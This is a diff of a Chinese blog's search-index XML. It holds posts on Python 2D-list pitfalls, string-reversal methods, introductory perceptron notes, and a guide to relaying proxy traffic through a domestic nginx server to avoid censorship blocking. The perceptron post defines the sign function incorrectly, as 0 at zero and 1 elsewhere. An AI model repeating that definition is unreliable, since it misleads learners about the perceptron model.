<span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [temp_list, temp_list]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list</span><br><span class="line">[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>所以这么用list定义二维数组的方法是错的，那么正确的方式应该怎么做呢？</p>
-<h4 id="2-正确方式"><a href="#2-正确方式" class="headerlink" title="2. 正确方式"></a>2. 正确方式</h4><p>我们可以用for来定义二维数组。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra = [ [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>)]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>可以看到这样做就没有上面的错误出现了。</p>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
     <title>朴素贝叶斯的三个常用模型</title>
     <url>/2019/10/14/navie-bayes/</url>
     <content><![CDATA[<p>高斯、多项式、伯努利<a id="more"></a></p>
@@ -673,23 +660,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Python实现字符串反转的几种方法</title>
-    <url>/2019/11/15/py-str-reverse/</url>
-    <content><![CDATA[<p>你能想到几种？<a id="more"></a></p>
-<h3 id="1-使用字符串切片"><a href="#1-使用字符串切片" class="headerlink" title="1. 使用字符串切片"></a>1. 使用字符串切片</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = s[::<span class="hljs-number">-1</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2-使用列表的reverse方法"><a href="#2-使用列表的reverse方法" class="headerlink" title="2. 使用列表的reverse方法"></a>2. 使用列表的reverse方法</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l.reverse()</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'g'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'a'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>同理，可以用<code>&#39;&#39;.join(l[::-1])</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">-1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="3-使用reduce"><a href="#3-使用reduce" class="headerlink" title="3. 使用reduce"></a>3. 使用reduce</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = reduce(<span class="hljs-keyword">lambda</span> x,y:y+x, s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>在这里简单复习一下reduce<br>使用<code>reduce</code>需要先<code>from functools import reduce</code><br><code>reduce</code>有2个参数，一个是函数，另一个是可迭代对象。在这里的函数是匿名函数<code>lambda</code>，作用是输入x和y返回y+x，可迭代对象是字符串<code>&#39;abcdefg&#39;</code>。<br>具体过程是<code>x = &#39;a&#39;, y = &#39;b&#39;</code>返回<code>&#39;ba&#39;</code>，之后<code>&#39;x = &#39;ba&#39;, y = c</code>返回<code>&#39;cba&#39;</code>这样迭代完整个字符串就可以达到反转字符串的效果。</p>
-<h3 id="4-使用递归函数"><a href="#4-使用递归函数" class="headerlink" title="4. 使用递归函数"></a>4. 使用递归函数</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-keyword">if</span> len(s) == <span class="hljs-number">1</span>:</span><br><span class="line">		<span class="hljs-keyword">return</span> s</span><br><span class="line">	<span class="hljs-keyword">return</span> func(s[<span class="hljs-number">1</span>:]) + s[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
-<h3 id="5-使用栈"><a href="#5-使用栈" class="headerlink" title="5. 使用栈"></a>5. 使用栈</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-comment">#模拟全部字符入栈</span></span><br><span class="line">	l = list(s)</span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	<span class="hljs-keyword">while</span> len(l)&gt;<span class="hljs-number">0</span>:</span><br><span class="line">		<span class="hljs-comment">#模拟出栈</span></span><br><span class="line">		ans += l.pop()</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
-<h3 id="6-for循环"><a href="#6-for循环" class="headerlink" title="6. for循环"></a>6. for循环</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	max_index = len(s) - <span class="hljs-number">1</span></span><br><span class="line">	<span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(s):</span><br><span class="line">		ans += s[max_index-index]</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure><br>简单学习一下<code>enumerate</code>，它是python中的内置函数，适用于python2.x和python3.x<br><code>enumerate</code>在字典里是枚举、列举的意思<br><code>enumerate</code>参数为可遍历/可迭代的对象（如列表、字符串等）<br>例如：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(l):</span><br><span class="line"><span class="hljs-meta">... </span>    print(<span class="hljs-string">'%s, %s'</span> % (index, value))</span><br><span class="line">...</span><br><span class="line"><span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-number">2</span>, <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">3</span>, <span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-number">4</span>, <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-number">5</span>, <span class="hljs-number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
-<hr>
-<p>转自<a href="https://www.cnblogs.com/taceywong/p/8045127.html" target="_blank" rel="noopener">https://www.cnblogs.com/taceywong/p/8045127.html</a></p>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
     <title>通过国内服务器转发流量科学上网</title>
     <url>/2020/02/04/network-jump/</url>
     <content><![CDATA[<p>从除夕那天开始，我的代理服务器就被GFW墙掉了，前些天重新搭了一个，先是被封端口，过了几天ip又被墙掉了，为了解决这个问题，因此有了这篇文章。<a id="more"></a><br>具体方法借鉴于该篇文章：<a href="https://www.hijk.pw/forward-traffic-via-internal-vps/" target="_blank" rel="noopener">Click Here</a><br>如果您不愿多点击一次链接，就请继续往下看，本文对于上述博文稍作整理。<br>完成此博文所介绍的方法的基本条件：</p>
@@ -707,7 +677,7 @@
 <h3 id="二、国内服务器配置流量转发程序"><a href="#二、国内服务器配置流量转发程序" class="headerlink" title="二、国内服务器配置流量转发程序"></a>二、国内服务器配置流量转发程序</h3><p>这里用到nginx来配置流量转发</p>
 <h4 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></p>
 <h4 id="配置文件修改"><a href="#配置文件修改" class="headerlink" title="配置文件修改"></a>配置文件修改</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">vi /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><br>添加<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">        server &#123;</span><br><span class="line">                listen Port; # 国内服务器的监听端口</span><br><span class="line">                proxy_pass 境外VPS的IP:Port;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>保存之后配置开机自启以及启动nginx<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">systemctl <span class="hljs-built_in">enable</span> nginx &amp;&amp; systemctl start nginx</span><br></pre></td></tr></table></figure><br>如果你的服务器是阿里云或者腾讯云诸如此类，还需要配置安全组规则，开放TCP连接的listen中配置的端口。<br>如果你之前配置过了代理服务器，那现在将自己机器上的代理软件的IP地址和端口号改为国内这台服务器的地址和端口，应该就能实现科学上网了。<br>如果不行，请检查一下国内服务器有没有配置防火墙规则等。</p>
-<h3 id="三、配置境外VPS"><a href="#三、配置境外VPS" class="headerlink" title="三、配置境外VPS"></a>三、配置境外VPS</h3><p>如果之前你的境外VPS没有配置过代理程序，配置代理的方法具体请参考我的另一篇文章：<a href="https://fansblog.club/2019/06/29/ipv6/">Click Here</a><br>对境外VPS配置一番，主要是为了降低GFW的干扰，减少IP地址被墙的几率。<br><code>除了ssh的22端口，网站的80/443端口，其他端口只允许国内那台服务器的连接。</code></p>
+<h3 id="三、配置境外VPS"><a href="#三、配置境外VPS" class="headerlink" title="三、配置境外VPS"></a>三、配置境外VPS</h3><p>如果之前你的境外VPS没有配置过代理程序，配置代理的方法具体请参考我的另一篇文章：<a href="https://fansblog.club/2019/06/29/ipv6/" target="_blank" rel="noopener">Click Here</a><br>对境外VPS配置一番，主要是为了降低GFW的干扰，减少IP地址被墙的几率。<br><code>除了ssh的22端口，网站的80/443端口，其他端口只允许国内那台服务器的连接。</code></p>
 <h4 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h4><p>这里使用的是ubuntu的防火墙<code>ufw</code>。<br>ufw命令举例：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment"># 允许某个端口连接</span></span><br><span class="line">ufw allow port</span><br><span class="line"><span class="hljs-comment"># 允许此IP访问所有的本机端口</span></span><br><span class="line">ufw allow from IPv4</span><br><span class="line"><span class="hljs-comment"># 开启防火墙</span></span><br><span class="line">ufw <span class="hljs-built_in">enable</span></span><br></pre></td></tr></table></figure><br>经过上述配置后，GFW探测你的VPS，除了ssh和网站的常用端口外，ss/ssr的端口根本无法连接，IP地址的被墙的几率自然就降低了。</p>
 <h4 id="将境外VPS伪装的更像一个网站"><a href="#将境外VPS伪装的更像一个网站" class="headerlink" title="将境外VPS伪装的更像一个网站"></a>将境外VPS伪装的更像一个网站</h4><p>为了把境外VPS做的更像一个网站，因此我们在这台服务器上再放一些web页面。<br>同样的安装nginx<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install nginx</span><br></pre></td></tr></table></figure><br>nginx安装完成的时候会自动启动，打开浏览器输入你服务器的IP地址，你会看到如下的界面。<br><img src="/2020/02/04/network-jump/4.jpg" alt="Welcome"><br>nginx的默认目录在<code>/var/www/html/</code><br>我们将静态页面放到这里面就可以了，一定要有个index.html哦。<br>因为我的博客repo在我的github上，因此我就直接git clone到上面这个目录下了。<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> /var/www/html/</span><br><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/aestheticisma/aestheticisma.github.io</span><br><span class="line"><span class="hljs-comment"># 之后将aestheticisma.github.io里面的东西全部移动到/var/www/html/下</span></span><br><span class="line"><span class="hljs-built_in">cd</span> aestheticisma.github.io/</span><br><span class="line">cp -r ./* ..</span><br></pre></td></tr></table></figure><br>再次在浏览器输入服务器ip地址就会发现有东西显示了。<br>这样我们的境外VPS伪装完成了。</p>
 <h3 id="四、关于自己机器上的代理配置说明"><a href="#四、关于自己机器上的代理配置说明" class="headerlink" title="四、关于自己机器上的代理配置说明"></a>四、关于自己机器上的代理配置说明</h3><p>如果你之前用过shadowsocks诸如此类代理软件，就是相当于把ip地址和端口号换成了国内服务器的ip地址和在nginx中配置的监听端口号，其他的密码等都是和之前一样的，因为代理服务还是配置在境外VPS上的，国内的服务器只是起到了一个转发流量的作用。</p>
@@ -717,10 +687,51 @@
       </categories>
   </entry>
   <entry>
+    <title>感知机原理及其代码实现</title>
+    <url>/2020/07/03/perceptron/</url>
+    <content><![CDATA[<p>开始更新《统计学习方法》的笔记理解以及代码实现系列。边学边记录吧，加油。<a id="more"></a></p>
+<p>感知机(perceptron)是二类分类的线形分类模型，其输入为实例的特征向量，输出为实例的类别，取<code>+1</code>和<code>-1</code>二值。感知机对应于输入空间（特征空间）中将实例划分为正负两类的分离超平面，属于<strong>判别模型</strong>。其旨在求出将训练数据进行线性划分的分离超平面，为此，导入基于误分类的损失函数，利用梯度下降法对损失函数进行极小化，求得感知机模型。分为原始形式和对偶形式。感知机在1957年由Rosenblatt提出，是神经网络与支持向量机的基础。——摘自《统计学习方法》P35。</p>
+<h3 id="1-感知机模型"><a href="#1-感知机模型" class="headerlink" title="1. 感知机模型"></a>1. 感知机模型</h3><p>定义（感知机）：假设输入空间（特征空间）是 $\chi \subseteq \mathcal{R}^2$，输出空间是 $\mathcal{Y} = \lbrace+1, -1\rbrace$。输入$x \in \chi$表示实例的特征向量，对应于输入空间（特征空间）的点；输出$y \in \mathcal{Y}$表示实例的类别。由输入空间到输出空间的如下函数：<br>$$f(x) = sign(w \cdot x + b) \tag{1.1}$$<br>称为感知机。其中 $w$ 和 $b$ 为感知机模型参数，$w \in \mathcal{R}^n$ 叫作权值(weight)或权值向量(weight vector)，$b \in \mathcal{R}$ 叫作偏置(bias)，$w \cdot x + b$ 表示 $w$ 和 $x$ 的内积。$sign$ 是符号函数，即<br>$$f(x)=<br>\begin{cases}<br>0&amp; \text{x=0}\<br>1&amp; \text{x!=0}<br>\end{cases}$$</p>
+]]></content>
+      <categories>
+        <category>统计学习方法</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Python中如何定义二维数组</title>
+    <url>/2019/11/17/py-cre-douarr/</url>
+    <content><![CDATA[<p>小知识点随手记录…<a id="more"></a></p>
+<h3 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h3><p>或许你会说用numpy中的数组不就可以了，想定义几维就几维，没错numpy确实方便很多。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> numpy</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = numpy.zeros((<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>],</span><br><span class="line">       [<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>]])</span><br></pre></td></tr></table></figure><br>但如果不用numpy呢？</p>
+<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>有人会说可以定义一个二维列表代替二维数组呗。</p>
+<h4 id="1-错误方式"><a href="#1-错误方式" class="headerlink" title="1. 错误方式"></a>1. 错误方式</h4><p>一开始一定会有人这样定义<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span>]*<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>看是不是成功了，但当我们修改其中的某个值的时候，就会发现奇怪的地方<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>特么的怎么连<code>a[1][0]</code>也跟着变成1了，因为上面的定义方式等价于：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list = [<span class="hljs-number">0</span>] * <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [temp_list, temp_list]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list</span><br><span class="line">[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>所以这么用list定义二维数组的方法是错的，那么正确的方式应该怎么做呢？</p>
+<h4 id="2-正确方式"><a href="#2-正确方式" class="headerlink" title="2. 正确方式"></a>2. 正确方式</h4><p>我们可以用for来定义二维数组。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra = [ [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>)]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>可以看到这样做就没有上面的错误出现了。</p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Python实现字符串反转的几种方法</title>
+    <url>/2019/11/15/py-str-reverse/</url>
+    <content><![CDATA[<p>你能想到几种？<a id="more"></a></p>
+<h3 id="1-使用字符串切片"><a href="#1-使用字符串切片" class="headerlink" title="1. 使用字符串切片"></a>1. 使用字符串切片</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = s[::<span class="hljs-number">-1</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2-使用列表的reverse方法"><a href="#2-使用列表的reverse方法" class="headerlink" title="2. 使用列表的reverse方法"></a>2. 使用列表的reverse方法</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l.reverse()</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'g'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'a'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>同理，可以用<code>&#39;&#39;.join(l[::-1])</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">-1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="3-使用reduce"><a href="#3-使用reduce" class="headerlink" title="3. 使用reduce"></a>3. 使用reduce</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = reduce(<span class="hljs-keyword">lambda</span> x,y:y+x, s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>在这里简单复习一下reduce<br>使用<code>reduce</code>需要先<code>from functools import reduce</code><br><code>reduce</code>有2个参数，一个是函数，另一个是可迭代对象。在这里的函数是匿名函数<code>lambda</code>，作用是输入x和y返回y+x，可迭代对象是字符串<code>&#39;abcdefg&#39;</code>。<br>具体过程是<code>x = &#39;a&#39;, y = &#39;b&#39;</code>返回<code>&#39;ba&#39;</code>，之后<code>&#39;x = &#39;ba&#39;, y = c</code>返回<code>&#39;cba&#39;</code>这样迭代完整个字符串就可以达到反转字符串的效果。</p>
+<h3 id="4-使用递归函数"><a href="#4-使用递归函数" class="headerlink" title="4. 使用递归函数"></a>4. 使用递归函数</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-keyword">if</span> len(s) == <span class="hljs-number">1</span>:</span><br><span class="line">		<span class="hljs-keyword">return</span> s</span><br><span class="line">	<span class="hljs-keyword">return</span> func(s[<span class="hljs-number">1</span>:]) + s[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
+<h3 id="5-使用栈"><a href="#5-使用栈" class="headerlink" title="5. 使用栈"></a>5. 使用栈</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-comment">#模拟全部字符入栈</span></span><br><span class="line">	l = list(s)</span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	<span class="hljs-keyword">while</span> len(l)&gt;<span class="hljs-number">0</span>:</span><br><span class="line">		<span class="hljs-comment">#模拟出栈</span></span><br><span class="line">		ans += l.pop()</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
